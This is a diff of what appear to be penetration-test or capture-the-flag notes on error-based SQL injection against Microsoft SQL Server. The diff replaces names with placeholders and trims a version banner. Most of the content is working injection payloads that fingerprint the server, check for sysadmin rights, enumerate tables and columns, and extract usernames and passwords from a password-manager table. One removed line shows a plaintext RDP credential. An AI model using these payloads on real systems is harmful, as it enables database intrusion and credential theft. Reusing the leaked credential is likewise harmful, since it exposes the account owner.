@@ -53,10 +53,7 @@ This query was working as this:&#x20;
 ```
 '+convert(char,(SELECT IIF(SUBSTRING(HOST_NAME(),1,1)='A',3,@@VERSION)))+'
 
-Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
-Aug 22 2017 17:04:49
-Copyright (C) 2017 Microsoft Corporation
-Express Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+Microsoft SQL Server 2017 (RTM)
 ```
 
 ```
@@ -68,9 +65,9 @@ Express Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393
 https://www.exploit-db.com/papers/12975
 
 ```
-'+convert(int,(user_name()))+' - appuser
+'+convert(int,(user_name()))+' - testuser
 
-'+(SELECT CASE WHEN (is_srvrolemember('sysadmin', 'appuser')=0) THEN 1/0 ELSE NULL END)+' - Nope 
+'+(SELECT CASE WHEN (is_srvrolemember('sysadmin', 'testuser')=0) THEN 1/0 ELSE NULL END)+' - Nope 
 
 '+(SELECT CASE WHEN (is_srvrolemember('sysadmin')=1) THEN 1/0 ELSE NULL END)+' - True
 ```
@@ -92,31 +89,19 @@ Got a good table if not,
 ```
 convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('Download_Document','login_audit')))  
 - Keep going find a proper table name
-
-'+convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('users')))+' 
-- There is no other
 ```
 
 ```
 '+convert(int,(select top 1 column_name from information_schema.columns where table_name='users'))+'
 
-id
+'+convert(int,(select top 1 column_name from information_schema.columns where column_name not in ('col1','col2','col3')))+'
 
-'+convert(int,(select top 1 column_name from information_schema.columns where table_name not in ('id')))+'
+'+convert(int,(select top 1 username from users))+'
 
-email
-username
-
-'+convert(int,(select top 1 column_name from information_schema.columns where column_name not in ('id','email','username')))+'
-
-'+convert(int,(select top 1 username from users where username not in ('test','test2'')))+'
-
-test, test2
-
-'+convert(int,(select top 1 email from users where email not in ('test@test.local','test2@test.local')))+'
+'+convert(int,(select top 1 username from users where username not in ('user1','user2'')))+'
 ```
 
-We can not go further with these.
+#### Different Approach
 
 https://github.com/shauntdergrigorian/CTF-Notes
 
@@ -135,13 +120,11 @@ Getting other db - DB_NAME(i) 0<i<7(To get no error)
 not in ('alogin','id','psw')))+'
 
 '+convert(int,(SELECT top 1 alogin FROM archive..pmanager where alogin 
-not in ('REDACTED', 'REDACTED','REDACTED','carl')))+'
+not in ('REDACTED', 'REDACTED','REDACTED','REDACTED')))+'
 
 '+convert(int,(SELECT top 1 psw FROM archive..pmanager where psw not in 
 ('REDACTED','REDACTED',
 'REDACTED','REDACTED')))+'
 
 '+convert(int,(select top 1 column_name from archive..pmanager.alogin))+'
-
-carl: passpass123 - RDP Credential
 ```
